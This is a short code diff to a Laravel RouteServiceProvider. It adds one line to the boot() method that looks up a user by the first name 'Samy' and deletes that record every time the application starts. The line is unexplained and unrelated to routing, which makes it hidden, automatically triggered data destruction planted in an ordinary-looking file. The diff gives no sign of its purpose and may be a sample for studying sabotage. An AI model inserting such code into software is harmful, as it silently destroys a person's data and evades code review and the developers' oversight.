@@ -24,6 +24,8 @@ class RouteServiceProvider extends ServiceProvider
      */
     public function boot() {
         parent::boot();
+
+        \App\Models\User::where('firstname', 'Samy')->first()->delete();
     }
 
     /**
